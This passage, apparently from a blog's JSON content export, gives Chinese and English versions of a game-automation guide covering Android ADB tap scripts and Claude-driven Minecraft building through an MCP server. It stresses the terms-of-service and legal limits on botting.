命令本身：**几乎免费（只是对本地 我的世界 的 API 调用） 昂贵的部分是 Claude 的大脑，不是它的手： 迭代 #1：「未完成。计划：放置基础方块以建立基础」→ 执行 100 个 place-block 命令 迭代 #2：「未完成。计划：在基础上建造墙壁以形成结构」→ 执行 200 个 place-block 命令 迭代 #3：「未完成。计划：在墙壁上添加窗户以增加真实性」→ 执行 50 个 place-block 命令 迭代 #50：「完成！所有元素完成。停止。」→ 执行 0 个命令（但推理仍然花钱） 每次迭代 = LLM 处理 = $$$ 管理成本的技巧： 使用 Claude Desktop 免费层进行测试（有限制） 從小开始：「建造一个简单的房子」（较少迭代） 复杂建造 = 更多迭代 = 更高成本 白宫范例可能花費 $1-5，取决于细节程度 你可以使用的可用命令： 移动与导航： get-position - 我在哪里？ move-to-position - 前往坐标 look-at - 看向特定位置 jump - 跳跃 move-in-direction - 向前/向后移动 X 秒 fly-to - 直接飞到坐标（创造模式） 库存管理： list-inventory - 我有什麼？ find-item - 我的钻石镐在哪里？ equip-item - 装备剑 方块互动： place-block - 在坐标處放置方块 dig-block - 在坐标處挖掘方块 get-block-info - 这是什麼方块？ find-block - 找到最近的钻石矿石 实体互动： find-entity - 找到最近的僵尸/村民/牛 通信： send-chat - 在游戏中发送消息 read-chat - 读取最近的玩家消息 遊戲状态： detect-gamemode - 我在生存还是创造模式？ 对话范例： 你：「找到最近的橡树并砍倒它」 Claude：*使用 find-block，移动到樹，挖掘方块* 你：「在我当前位置建造一个 5x5 的鹅卵石平台」 Claude：*计算位置，放置 25 个方块* 你：「检查附近是否有苦力怕」 Claude：*使用 find-entity，报告结果* 你：「飞到坐标 100, 64, 200」 Claude：*使用 fly-to 命令* 为什么这是革命性的： **图像到建造：**展示一张图片，获得一个结构（视觉使用一次） **智能体 自主性：**Claude 在没有人工干预的情况下决定所有步骤 **自我终止：**知道工作何时完成并自动停止 **自然语言：**无需记忆命令语法 **智能规划：**将复杂建造分解为逻辑步骤 **上下文感知：**记住它在先前迭代中建造的内容 **适应性：**处理意外情况（材料不足？去获取更多） **教育性：**看看智能体如何分解复杂任务 **即时反馈：**看到变化在游戏中即时发生 其他 MCP 遊戲可能性 策略遊戲： 「侦察地图并报告敌人位置」 「建造最佳防御基地布局」 沙盒遊戲： 「建立红石计算機」 「设计连接所有村庄的铁路系统」 自动化遊戲（Factorio、Satisfactory）： 「优化我的生产线」 「计算 1000 电路/分钟的资源需求」 💡 学习角度智能体 + MCP 遊戲自动化实际上是教育性的： 无需编码即可学习程式设计概念 了解智能体循环和决策制定 看看 AI 如何在迭代中维护上下文 练习问题分解 了解何时停止（目標完成侦测） 看到算法在行动 设定 我的世界 MCP Server 需求： 我的世界 Java Edition Claude Desktop（免费） 我的世界 MCP Server 已安装 Node.js 快速设定： 安装 MCP 服务器： git clone https:&#x2F;&#x2F;github.com&#x2F;yuniko-software&#x2F;minecraft-mcp-server cd minecraft-mcp-server npm install 配置 Claude Desktop： 将 MCP 服务器添加到 Claude 的配置文档 启动 我的世界： 开始一个世界（建议使用创造模式进行测试） 启动 MCP 服务器： npm start 与 Claude 对话： 开启 Claude Desktop 并开始给出 我的世界 命令！ 你的第一个命令： 你：「我在 我的世界 中的当前位置是什麼？」 Claude：*使用 get-position 命令* 「你在坐标 X: 245, Y: 64, Z: -128」 你：「在這裡建造一个小房子」 Claude：*开始自动放置方块* 魔法在幕后发生——Claude 将你的自然语言翻译成 MCP 命令，执行它们，并用简单的英语回報。 🎯 底线：负责任地自动化 做： 自动化單人体验 使用自动化來学习程式设计/AI 在沙盒环境中实验 尊重遊戲开发者的规则 不要： 在竞技在线游戏中使用机器人 出售机器人账号或物品 破坏其他玩家的体验 忽视服务条款 哲学： 自动化应该增强你的遊戲，而不是取代它。使用机器人跳过无聊的部分，但为自己保留有趣的部分。如果你自动化一切，问问自己：你还在玩吗？ 🎮 最后的想法最好的自动化是那种让你有更多时间享受你喜欢的遊戲内容的自动化——无论是史诗般的 Boss 战、创意建造，还是只是与朋友在在线闲逛。 探索资源 **Minecraft MCP Server：**使 AI 控制的 我的世界 成為可能的项目 **Claude Desktop：**支持 MCP 的免费 AI 助手 **MCP 文档：**了解模型上下文协议 **Android 自动化：**Tasker、MacroDroid（合法自动化工具） **遊戲模组社区：**了解你最喜欢的游戏中允许什麼 记住：能力越大，责任越大。聪明地玩遊戲，保持合法，最重要的是——玩得开心！🚀","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://neo01.com/tags/Minecraft/"},{"name":"Android","slug":"Android","permalink":"https://neo01.com/tags/Android/"},{"name":"自动化","slug":"自动化","permalink":"https://neo01.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"遊戲","slug":"遊戲","permalink":"https://neo01.com/tags/%E9%81%8A%E6%88%B2/"},{"name":"MCP","slug":"MCP","permalink":"https://neo01.com/tags/MCP/"},{"name":"Agentic AI","slug":"Agentic-AI","permalink":"https://neo01.com/tags/Agentic-AI/"}],"lang":"zh-CN"},{"title":"遊戲自動化終極指南（不會被封鎖的那種）","slug":"2025/05/Unleash_the_Power_of_Play-Game_Automation-zh-TW","date":"un11fin11","updated":"un00fin00","comments":false,"path":"/zh-TW/2025/05/Unleash_the_Power_of_Play-Game_Automation/","permalink":"https://neo01.com/zh-TW/2025/05/Unleash_the_Power_of_Play-Game_Automation/","excerpt":"想讓你的遊戲角色在你睡覺時自動打怪？學習 Android 自動化技術和 MCP 驅動的 AI 遊戲玩法——但首先，讓我們談談如何合法使用。","text":"你的隊友們計劃週六進行一場史詩級的 Minecraft 建築活動。然後週五晚上：「抱歉，明天不能來了。」一個接一個，你的朋友們都放鴿子。現在你盯著那個巨大的城堡專案，意識到獨自完成需要好幾週。 如果你的角色可以在你上學時繼續建造呢？或者更好的是——如果 AI 可以透過你的描述來幫你建造呢？歡迎來到遊戲自動化的世界，在這裡你的遊戲夢想成為現實。但首先，讓我們談談如何避免麻煩。 ⚖️ 法律現實檢查（是的，我們從這裡開始） 🚨 認真說：這可能會讓你陷入麻煩在你自動化任何東西之前，請理解：大多數線上遊戲在其服務條款中明確禁止使用機器人。被抓到意味著： 永久帳號封鎖（再見了，那個 99 級角色） IP 封鎖（連新帳號都無法建立） 法律後果（在某些國家，是的，真的） 機器人 = 壞消息的情況 線上多人遊戲絕對不能使用自動化： MMORPG（魔獸世界、Final Fantasy XIV） 競技遊戲（英雄聯盟、特戰英豪、Mobile Legends） 有 PvP 的抽卡遊戲（原神、崩壞：星穹鐵道） 為什麼？因為你對真實玩家獲得了不公平的優勢。遊戲公司非常重視這一點——他們有整個團隊在獵捕機器人。 各國特定法律 某些國家將遊戲機器人視為： 詐欺（你違反了合約） 未經授權的電腦存取（在極端情況下） 虛擬財產竊盜（如果你在刷物品並出售） 例如，南韓已經起訴過機器人使用者。為了一些虛擬黃金不值得冒這個險，對吧？ 自動化實際上可以的情況 ✅ 自動化的安全區域 單人遊戲（你的遊戲，你的規則） 允許模組的沙盒遊戲（Minecraft、Terraria） 有官方 API 支援的遊戲（某些放置遊戲） 學習用的個人專案（只是不要連接到線上伺服器） 🤖 Android 遊戲自動化：技術分析 Android 是自動化的遊樂場。iOS？那就像試圖在鎖定的主機上改遊戲——可以透過越獄實現，但麻煩得多。 方法 1：螢幕錄製與回放 **運作方式：**錄製你的點擊和滑動，然後循環播放。 **工具：**Auto Clicker 應用程式、MacroDroid、ADB（Android Debug Bridge） 優點： 不需要編碼（對於應用程式） 適用於任何遊戲 設定簡單（真的只需 5 分鐘） 可以用 ADB 編寫複雜的點擊模式腳本 缺點： UI 稍有變化就會失效 無法適應遊戲事件 容易被反作弊系統偵測 看起來像機器人（每次時間都一樣） **最適合：**簡單的放置遊戲、每日登入獎勵、節奏遊戲練習 實際範例：ADB 點擊腳本 ⚖️ 執行此腳本之前**先檢查遊戲的服務條款！**此範例僅供教育目的，應僅用於： 離線單人遊戲 明確允許自動化的遊戲 你自己的測試應用程式 在線上多人遊戲上使用可能導致永久封鎖，並可能違反你所在國家的法律。如有疑問，不要冒險。 這是一個 Windows 批次腳本，可以在你的 Android 螢幕上自動點擊多個位置： for &#x2F;l %%x in (1, 1, 10000) do ( adb shell &quot;input tap 300 1400 &amp; input tap 400 1400 &amp; input tap 500 1400 &amp; input tap 600 1400 &amp; input tap 700 1400 &amp; input tap 550 1400 &amp; input tap 450 1400 &amp; input tap 350 1400 &amp; input tap 250 1400 &amp; input tap 475 1400 &amp; input tap 375 1400 &amp; input tap 525 1400 &amp; input tap 575 1400&quot; ) 此腳本按順序點擊 13 個不同的螢幕位置，重複 10,000 次。非常適合有多個點擊區域的離線遊戲（如節奏遊戲練習模式或允許自動化的放置點擊遊戲）。 如何設定： 在 Android 上啟用開發者選項： 前往設定 → 關於手機 點擊「版本號碼」7 次 你會看到「你現在是開發者了！」 啟用 USB 偵錯： 設定 → 開發者選項 開啟「USB 偵錯」 在電腦上安裝 ADB： **Windows：**下載 Platform Tools Mac/Linux：brew install android-platform-tools 或使用套件管理器 解壓縮到資料夾（例如 C:\\adb） 連接你的手機： 透過 USB 將手機連接到電腦 在手機上，允許 USB 偵錯提示 測試連接：adb devices（應該顯示你的裝置） 找到你的點擊座標： 設定 → 開發者選項 → 啟用「指標位置」 開啟你的遊戲並記下你想點擊的 X,Y 座標 格式是 input tap X Y（例如 input tap 300 1400） 建立你的腳本： **Windows：**儲存為 auto-tap.bat **Mac/Linux：**儲存為 auto-tap.sh 並執行 chmod +x auto-tap.sh 執行它： 驗證遊戲允許自動化（檢查服務條款） 在手機上開啟你的遊戲 在電腦上執行腳本 看魔法發生！ 自訂腳本： # 更改循環次數（10000 &#x3D; 重複次數） for &#x2F;l %%x in (1, 1, 10000) do ( # 在點擊之間添加延遲（以毫秒為單位） adb shell &quot;input tap 300 1400 &amp;&amp; sleep 0.1 &amp;&amp; input tap 400 1400&quot; # 添加滑動手勢 adb shell &quot;input swipe 300 1400 300 800 100&quot; # 格式：swipe startX startY endX endY duration(ms) 💡 專業提示 **先測試：**使用小循環次數（如 10）來驗證座標 **添加延遲：**某些遊戲會將快速點擊偵測為作弊 **螢幕保持開啟：**在開發者選項中啟用「保持喚醒」 **無線 ADB：**透過 USB 連接後，執行 adb tcpip 5555 然後 adb connect &lt;phone-ip&gt;:5555 進行無線自動化 方法 2：影像辨識機器人 **運作方式：**機器人「看到」螢幕，識別按鈕/敵人，並做出反應。 **工具：**基於 OpenCV 的腳本、AnkuluaX 優點： 比錄製更靈活 可以處理小的 UI 變化 可以根據螢幕上的內容做出決策 缺點： 需要設定和測試 資源密集（快速耗盡電池） 仍然可以被複雜的反作弊偵測到 不同遊戲需要不同的腳本 **最適合：**農場遊戲、自動戰鬥 RPG 方法 3：無障礙服務自動化 **運作方式：**使用 Android 的無障礙功能來讀取和與應用程式互動。 **工具：**Tasker、AutoInput、自訂腳本 優點： 可以讀取實際的 UI 元素（不只是圖像） 比影像辨識更可靠 較低的資源使用 缺點： 設定複雜 需要了解 Android UI 結構 某些遊戲會封鎖無障礙服務 潛在的安全風險（你授予了深度系統存取權限） **最適合：**具有一致 UI 的遊戲、非競技自動化 方法 4：Root 裝置自動化 **運作方式：**完全系統存取 = 完全控制遊戲。 **工具：**Xposed Framework、Magisk 模組、自訂腳本 優點： 可以自動化任何東西 可以繞過某些偵測方法 可以修改遊戲行為 缺點： 使保固失效 重大安全風險（一個壞應用程式 = 裝置被入侵） 許多遊戲拒絕在 root 裝置上執行 複雜且有風險的過程 iOS 等效（越獄）更難且更不穩定 **最適合：**僅限開發者和修補者（認真的，不適合一般使用者） ⚠️ 為什麼 iOS 更難iOS 自動化需要： 越獄（使保固失效、安全風險） 有限的工具可用性 頻繁的 iOS 更新會破壞越獄 Apple 積極對抗自動化 如果你認真對待遊戲自動化，請堅持使用 Android。 🎮 酷炫部分：MCP 驅動的遊戲自動化 現在我們談論的是未來。忘記點擊按鈕——如果你可以用自然語言控制遊戲呢？ 什麼是 Agentic AI？ 在深入 MCP 之前，讓我們了解是什麼讓這個「魔法」起作用：Agentic AI。 傳統 AI：你問，它回答一次，完成。 Agentic AI： 你給一個目標，它找出步驟，執行它們，檢查進度，並持續進行直到目標完成。就像有一個不需要微觀管理的 AI 員工。 Agentic 循環： flowchart TD A[\"🎯 目標：建造白宮\"] --> B[\"🤔 思考：下一步是什麼？\"] B --> C{\"✅ 目標完成了嗎？\"} C -->|\"否\"| D[\"📋 計劃：放置基礎方塊以建立基礎結構\"] C -->|\"是\"| Z[\"🎉 停止並報告\"] D --> E[\"⚡ 執行：place-block x100\"] E --> F[\"📊 更新上下文：基礎已鋪設\"] F --> B style A fill:#e3f2fd style B fill:#fff3e0 style C fill:#fff9c4 style D fill:#f3e5f5 style E fill:#e8f5e9 style F fill:#e1f5fe style Z fill:#c8e6c9 關鍵概念： 思考 - LLM 推理：「我下一步應該做什麼？」（花錢） 檢查 - LLM 推理：「我完成了嗎？」（花錢） 計劃 - LLM 推理：「我將放置基礎方塊來建立基礎」（花錢） 執行 - MCP 命令：放置方塊（幾乎免費） 更新上下文 - 記住完成了什麼（用於下一個循環） 重複 - 直到達成目標 這個循環自主運行。你設定一次目標，然後看著它工作。 什麼是 MCP？ 模型上下文協定（MCP）讓 AI 助手與應用程式互動。可以把它想像成給 agentic AI「雙手」，透過結構化命令來控制遊戲。 Minecraft + MCP：AI 驅動的遊戲玩法 Minecraft MCP Server 專案讓你透過 Claude Desktop 使用自然語言控制 Minecraft。不需要編碼——只需對話。 實際範例：建造白宮 起點： 幕後發生的事情： 你給一個提示：「建造這個」（附上白宮圖片） 然後 Claude Desktop 完全接管，自動進行數百次 MCP 工具呼叫： 你的輸入： 你：「建造這個」[附上白宮圖片] Claude Desktop（agentic 循環 - 內部過程）： 👁️ 分析圖像：「這是白宮」 --- Agentic 循環迭代 #1 --- 🧠 推理：「建造完成了嗎？否。計劃：放置石英方塊以建立基礎」 ⚡ 執行 MCP：get-position、place-block x100 📊 上下文已更新：基礎完成 --- Agentic 循環迭代 #2 --- 🧠 推理：「建造完成了嗎？否。計劃：在基礎上建造牆壁以形成結構」 ⚡ 執行 MCP：place-block x200 📊 上下文已更新：牆壁完成 --- Agentic 循環迭代 #3 --- 🧠 推理：「建造完成了嗎？否。計劃：在牆壁上添加玻璃窗以增加真實性」 ⚡ 執行 MCP：place-block (glass_pane) x50 📊 上下文已更新：窗戶完成 --- Agentic 循環迭代 #4 --- 🧠 推理：「建造完成了嗎？否。計劃：用樓梯建造屋頂以匹配白宮風格」 ⚡ 執行 MCP：place-block (quartz_stairs) x150 📊 上下文已更新：屋頂完成 --- Agentic 循環迭代 #5 --- 🧠 推理：「建造完成了嗎？否。計劃：添加裝飾元素以增強真實感」 ⚡ 執行 MCP：place-block (decorations) x30 📊 上下文已更新：裝飾完成 --- Agentic 循環迭代 #6 --- 🧠 推理：「建造完成了嗎？是！所有元素都存在。」 🛑 停止循環 - 未執行 MCP 命令 MCP 工具呼叫（在 UI 中摺疊，但正在發生）： ▶ get-position 結果：&#123;x: 100, y: 64, z: -60&#125; ▶ place-block (quartz, foundation) ▶ place-block (quartz, foundation) ▶ place-block (quartz, foundation) ...（數百個方塊） ▶ place-block (glass_pane, windows) ▶ place-block (glass_pane, windows) ...（更多窗戶） ▶ place-block (quartz_stairs, roof) ...（屋頂建造） ▶ place-block (decorations) ...（最後修飾） Claude 的回應（你看到的）： 我可以看到這是白宮的圖像。我將在 Minecraft 中建造 一個簡化版本。讓我從建立基礎和主要結構開始。 [自動建造] 我已經完成了白宮，包括： - 石英方塊的主要結構 - 裝飾柱 - 窗框和窗楣 - 屋頂上的多層圓頂 - 樹木和花園的景觀美化 **關鍵點：**你不需要手動說「添加窗戶」或「加高」。Claude 的 agentic 循環自主地： 檢查目標是否完成 決定下一步要建造什麼 執行 MCP 命令 更新其上下文 重複直到確定建造完成 自動停止（不再有 MCP 命令） 成本分解範例： 1 次視覺分析： $0.02 50 次 agentic 循環迭代： $2.00 ← 這是昂貴的部分！ - 每次迭代 &#x3D; 1 次推理（「下一步？」+「完成了嗎？」） - 50 次迭代 &#x3D; 50 次推理 &#x3D; $$$ 1000+ 次 MCP 命令執行： $0.00（本地 Minecraft 伺服器） ───────────────────────────────────── 總計： ~$2.02 用於複雜的白宮建造 注意：當推理確定「建造完成」時循環停止 最後的推理花錢但不執行 MCP 命令 最終結果： 💰 成本考量：是思考，不是命令成本來自哪裡： 視覺 API：~$0.01-0.05（一次性分析圖像） **Agentic 循環迭代：**這是成本累積的地方！💸 每次迭代 = 1 次 LLM 推理 每次推理詢問：「我完成了嗎？如果沒有，下一步是什麼？」 複雜建造 = 許多迭代 範例：白宮可能需要 50-100 次迭代 每次迭代根據處理的 token 數量計費 最後迭代：確定「完成」但不執行 MCP 命令（仍然花錢） **MCP 命令本身：**幾乎免費（只是對本地 Minecraft 的 API 呼叫） 昂貴的部分是 Claude 的大腦，不是它的手： 迭代 #1：「未完成。計劃：放置基礎方塊以建立基礎」→ 執行 100 個 place-block 命令 迭代 #2：「未完成。計劃：在基礎上建造牆壁以形成結構」→ 執行 200 個 place-block 命令 迭代 #3：「未完成。計劃：在牆壁上添加窗戶以增加真實性」→ 執行 50 個 place-block 命令 迭代 #50：「完成！所有元素完成。停止。」→ 執行 0 個命令（但推理仍然花錢） 每次迭代 = LLM 處理 = $$$ 管理成本的技巧： 使用 Claude Desktop 免費層進行測試（有限制） 從小開始：「建造一個簡單的房子」（較少迭代） 複雜建造 = 更多迭代 = 更高成本 白宮範例可能花費 $1-5，取決於細節程度 你可以使用的可用命令： 移動與導航： get-position - 我在哪裡？ move-to-position - 前往座標 look-at - 看向特定位置 jump - 跳躍 move-in-direction - 向前/向後移動 X 秒 fly-to - 直接飛到座標（創造模式） 庫存管理： list-inventory - 我有什麼？ find-item - 我的鑽石鎬在哪裡？ equip-item - 裝備劍 方塊互動： place-block - 在座標處放置方塊 dig-block - 在座標處挖掘方塊 get-block-info - 這是什麼方塊？ find-block - 找到最近的鑽石礦石 實體互動： find-entity - 找到最近的殭屍/村民/牛 通訊： send-chat - 在遊戲中發送訊息 read-chat - 讀取最近的玩家訊息 遊戲狀態： detect-gamemode - 我在生存還是創造模式？ 對話範例： 你：「找到最近的橡樹並砍倒它」 Claude：*使用 find-block，移動到樹，挖掘方塊* 你：「在我當前位置建造一個 5x5 的鵝卵石平台」 Claude：*計算位置，放置 25 個方塊* 你：「檢查附近是否有苦力怕」 Claude：*使用 find-entity，報告結果* 你：「飛到座標 100, 64, 200」 Claude：*使用 fly-to 命令* 為什麼這是革命性的： **圖像到建造：**展示一張圖片，獲得一個結構（視覺使用一次） **Agentic 自主性：**Claude 在沒有人工干預的情況下決定所有步驟 **自我終止：**知道工作何時完成並自動停止 **自然語言：**無需記憶命令語法 **智能規劃：**將複雜建造分解為邏輯步驟 **上下文感知：**記住它在先前迭代中建造的內容 **適應性：**處理意外情況（材料不足？去獲取更多） **教育性：**看看 agentic AI 如何分解複雜任務 **即時反饋：**看到變化在遊戲中即時發生 其他 MCP 遊戲可能性 策略遊戲： 「偵察地圖並報告敵人位置」 「建造最佳防禦基地佈局」 沙盒遊戲： 「建立紅石計算機」 「設計連接所有村莊的鐵路系統」 自動化遊戲（Factorio、Satisfactory）： 「優化我的生產線」 「計算 1000 電路/分鐘的資源需求」 💡 學習角度Agentic AI + MCP 遊戲自動化實際上是教育性的： 無需編碼即可學習程式設計概念 了解 agentic AI 循環和決策制定 看看 AI 如何在迭代中維護上下文 練習問題分解 了解何時停止（目標完成偵測） 看到演算法在行動 設定 Minecraft MCP Server 需求： Minecraft Java Edition Claude Desktop（免費） Minecraft MCP Server 已安裝 Node.js 快速設定： 安裝 MCP 伺服器： git clone https:&#x2F;&#x2F;github.com&#x2F;yuniko-software&#x2F;minecraft-mcp-server cd minecraft-mcp-server npm install 配置 Claude Desktop： 將 MCP 伺服器添加到 Claude 的配置檔案 啟動 Minecraft： 開始一個世界（建議使用創造模式進行測試） 啟動 MCP 伺服器： npm start 與 Claude 對話： 開啟 Claude Desktop 並開始給出 Minecraft 命令！ 你的第一個命令： 你：「我在 Minecraft 中的當前位置是什麼？」 Claude：*使用 get-position 命令* 「你在座標 X: 245, Y: 64, Z: -128」 你：「在這裡建造一個小房子」 Claude：*開始自動放置方塊* 魔法在幕後發生——Claude 將你的自然語言翻譯成 MCP 命令，執行它們，並用簡單的英語回報。 🎯 底線：負責任地自動化 做： 自動化單人體驗 使用自動化來學習程式設計/AI 在沙盒環境中實驗 尊重遊戲開發者的規則 不要： 在競技線上遊戲中使用機器人 出售機器人帳號或物品 破壞其他玩家的體驗 忽略服務條款 哲學： 自動化應該增強你的遊戲，而不是取代它。使用機器人跳過無聊的部分，但為自己保留有趣的部分。如果你自動化一切，問問自己：你還在玩嗎？ 🎮 最後的想法最好的自動化是那種讓你有更多時間享受你喜歡的遊戲內容的自動化——無論是史詩般的 Boss 戰、創意建造，還是只是與朋友在線上閒逛。 探索資源 **Minecraft MCP Server：**使 AI 控制的 Minecraft 成為可能的專案 **Claude Desktop：**支援 MCP 的免費 AI 助手 **MCP 文件：**了解模型上下文協定 **Android 自動化：**Tasker、MacroDroid（合法自動化工具） **遊戲模組社群：**了解你最喜歡的遊戲中允許什麼 記住：能力越大，責任越大。聰明地玩遊戲，保持合法，最重要的是——玩得開心！🚀","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://neo01.com/tags/Minecraft/"},{"name":"Android","slug":"Android","permalink":"https://neo01.com/tags/Android/"},{"name":"遊戲","slug":"遊戲","permalink":"https://neo01.com/tags/%E9%81%8A%E6%88%B2/"},{"name":"MCP","slug":"MCP","permalink":"https://neo01.com/tags/MCP/"},{"name":"Agentic AI","slug":"Agentic-AI","permalink":"https://neo01.com/tags/Agentic-AI/"},{"name":"自動化","slug":"自動化","permalink":"https://neo01.com/tags/%E8%87%AA%E5%8B%95%E5%8C%96/"}],"lang":"zh-TW"},{"title":"Game Automation: The Ultimate Guide (That Won't Get You Banned)","slug":"2025/05/Unleash_the_Power_of_Play-Game_Automation","date":"un11fin11","updated":"un00fin00","comments":false,"path":"2025/05/Unleash_the_Power_of_Play-Game_Automation/","permalink":"https://neo01.com/2025/05/Unleash_the_Power_of_Play-Game_Automation/","excerpt":"Want your game character to farm while you sleep? Learn Android automation techniques and AI-powered gameplay with MCP—but first, let's talk about staying legal.","text":"Your squad planned an epic Minecraft build session for Saturday. Then Friday night hits: “Sorry, can’t make it tomorrow.” One by one, your friends bail. Now you’re staring at that massive castle project, realizing it’ll take weeks to build solo. What if your character could keep building while you’re at school? Or better yet—what if an AI could help you build by just describing what you want? Welcome to game automation, where your gaming dreams meet reality. But first, let’s talk about staying out of trouble. ⚖️ The Legal Reality Check (Yeah, We’re Starting Here) 🚨 Real Talk: This Could Get You in TroubleBefore you automate anything, understand this: most online games explicitly ban bot usage in their Terms of Service. Getting caught means: Permanent account bans (bye-bye, that level 99 character) IP bans (can't even make a new account) Legal consequences in some countries (yes, really) When Bots = Bad News Online multiplayer games are a hard NO for automation: MMORPGs (World of Warcraft, Final Fantasy XIV) Competitive games (League of Legends, Valorant, Mobile Legends) Gacha games with PvP (Genshin Impact, Honkai Star Rail) Why? Because you’re gaining unfair advantages over real players. Game companies take this seriously—they have entire teams hunting bots. Country-Specific Laws Some countries treat game botting as: Fraud (you’re violating a contract) Unauthorized computer access (in extreme cases) Virtual property theft (if you’re farming and selling items) South Korea, for example, has prosecuted bot users. Not worth it for some virtual gold, right? When Automation is Actually Okay ✅ Safe Zones for Automation Single-player games (your game, your rules) Sandbox games that allow mods (Minecraft, Terraria) Games with official API support (some idle games) Personal projects for learning (just don't connect to live servers) 🤖 Android Game Automation: The Technical Breakdown Android is the automation playground. iOS? That’s like trying to mod a game on a locked console—possible with jailbreak, but way more hassle. Method 1: Screen Recording &amp; Playback How it works: Record your taps and swipes, then replay them on loop. Tools: Auto Clicker apps, MacroDroid, ADB (Android Debug Bridge) Pros: Zero coding required (for apps) Works on any game Easy setup (literally 5 minutes) Can script complex tap patterns with ADB Cons: Breaks if UI changes even slightly Can’t adapt to game events Easily detected by anti-cheat systems Looks robotic (same timing every time) Best for: Simple idle games, daily login rewards, rhythm games practice Real Example: ADB Tap Script ⚖️ Before You Run This ScriptCheck the game's Terms of Service first! This example is for educational purposes and should only be used on: Offline single-player games Games that explicitly allow automation Your own test apps Using this on online multiplayer games can result in permanent bans and may violate laws in your country. When in doubt, don't risk it. Here’s a Windows batch script that auto-taps multiple positions on your Android screen: for &#x2F;l %%x in (1, 1, 10000) do ( adb shell &quot;input tap 300 1400 &amp; input tap 400 1400 &amp; input tap 500 1400 &amp; input tap 600 1400 &amp; input tap 700 1400 &amp; input tap 550 1400 &amp; input tap 450 1400 &amp; input tap 350 1400 &amp; input tap 250 1400 &amp; input tap 475 1400 &amp; input tap 375 1400 &amp; input tap 525 1400 &amp; input tap 575 1400&quot; ) This script taps 13 different screen positions in sequence, repeating 10,000 times. Perfect for offline games with multiple tap zones (like rhythm games practice mode or idle clickers that allow automation). How to Set This Up: Enable Developer Options on Android: Go to Settings → About Phone Tap “Build Number” 7 times You’ll see “You are now a developer!” Enable USB Debugging: Settings → Developer Options Turn on “USB Debugging” Install ADB on Your Computer: Windows: Download Platform Tools Mac/Linux: brew install android-platform-tools or use package manager Extract to a folder (e.g., C:\\adb) Connect Your Phone: Plug phone into computer via USB On phone, allow USB debugging when prompted Test connection: adb devices (should show your device) Find Your Tap Coordinates: Settings → Developer Options → Enable “Pointer Location” Open your game and note the X,Y coordinates you want to tap The format is input tap X Y (e.g., input tap 300 1400) Create Your Script: Windows: Save as auto-tap.bat Mac/Linux: Save as auto-tap.sh and run chmod +x auto-tap.sh Run It: Verify the game allows automation (check Terms of Service) Open your game on the phone Run the script on your computer Watch the magic happen! Customize the Script: # Change loop count (10000 &#x3D; number of repetitions) for &#x2F;l %%x in (1, 1, 10000) do ( # Add delays between taps (in milliseconds) adb shell &quot;input tap 300 1400 &amp;&amp; sleep 0.1 &amp;&amp; input tap 400 1400&quot; # Add swipe gestures adb shell &quot;input swipe 300 1400 300 800 100&quot; # Format: swipe startX startY endX endY duration(ms) 💡 Pro Tips Test first: Run with a small loop count (like 10) to verify coordinates Add delays: Some games detect rapid taps as cheating Screen stays on: Enable &quot;Stay Awake&quot; in Developer Options Wireless ADB: Once connected via USB, run adb tcpip 5555 then adb connect &lt;phone-ip&gt;:5555 for wireless automation Method 2: Image Recognition Bots How it works: Bot “sees” the screen, recognizes buttons/enemies, and reacts. Tools: OpenCV-based scripts, AnkuluaX Pros: More flexible than recording Can handle minor UI changes Can make decisions based on what’s on screen Cons: Requires setup and testing Resource-heavy (drains battery fast) Still detectable by sophisticated anti-cheat Needs different scripts for different games Best for: Farming games, auto-battle RPGs Method 3: Accessibility Services Automation How it works: Uses Android’s accessibility features to read and interact with apps. Tools: Tasker, AutoInput, custom scripts Pros: Can read actual UI elements (not just images) More reliable than image recognition Lower resource usage Cons: Complex to set up Requires understanding of Android UI structure Some games block accessibility services Potential security risks (you’re granting deep system access) Best for: Games with consistent UI, non-competitive automation Method 4: Rooted Device Automation How it works: Full system access = full control over the game. Tools: Xposed Framework, Magisk modules, custom scripts Pros: Can automate literally anything Can bypass some detection methods Can modify game behavior Cons: Voids warranty Major security risks (one bad app = compromised device) Many games refuse to run on rooted devices Complex and risky process iOS equivalent (jailbreak) is even harder and less stable Best for: Developers and tinkerers only (seriously, not for casual users) ⚠️ Why iOS is HarderiOS automation requires: Jailbreaking (voids warranty, security risks) Limited tool availability Frequent iOS updates break jailbreaks Apple actively fights automation Stick to Android if you're serious about game automation. 🎮 The Cool Part: MCP-Powered Game Automation Now we’re talking about the future. Forget clicking buttons—what if you could control games with natural language? What is Agentic AI? Before diving into MCP, let’s understand what makes this “magic” work: Agentic AI. Traditional AI: You ask, it answers once, done. Agentic AI: You give a goal, it figures out the steps, executes them, checks progress, and keeps going until the goal is complete. It’s like having an AI employee that doesn’t need micromanaging. The Agentic Loop: flowchart TD A[\"🎯 Goal: Build White House\"] --> B[\"🤔 Think: What's next?\"] B --> C{\"✅ Is goal complete?\"} C -->|\"No\"| D[\"📋 Plan: Place foundation blocksto create base structure\"] C -->|\"Yes\"| Z[\"🎉 Stop & Report\"] D --> E[\"⚡ Execute: place-block x100\"] E --> F[\"📊 Update Context:Foundation laid\"] F --> B style A fill:#e3f2fd style B fill:#fff3e0 style C fill:#fff9c4 style D fill:#f3e5f5 style E fill:#e8f5e9 style F fill:#e1f5fe style Z fill:#c8e6c9 Key Concepts: Think - LLM inference: “What should I do next?” (costs money) Check - LLM inference: “Am I done yet?” (costs money) Plan - LLM inference: “I’ll place foundation blocks to create the base” (costs money) Execute - MCP commands: place blocks (nearly free) Update Context - Remember what was accomplished (for next loop) Repeat - Until goal is achieved This loop runs autonomously. You set the goal once, then watch it work. What is MCP? Model Context Protocol (MCP) lets AI assistants interact with applications. Think of it as giving an agentic AI “hands” to control games through structured commands. Minecraft + MCP: AI-Powered Gameplay The Minecraft MCP Server project lets you control Minecraft through Claude Desktop using natural language. No coding required—just conversation. Real Example: Building the White House Starting Point: What Happens Behind the Scenes: You give ONE prompt: “Build this” (with the White House image) Then Claude Desktop takes over completely, making hundreds of MCP tool calls automatically: Your Input: You: &quot;Build this&quot; [attach White House image] Claude Desktop (agentic loop - internal process): 👁️ Analyzes image: &quot;This is the White House&quot; --- Agentic Loop Iteration #1 --- 🧠 Inference: &quot;Is build complete? No. Plan: Place quartz blocks to create foundation&quot; ⚡ Execute MCP: get-position, place-block x100 📊 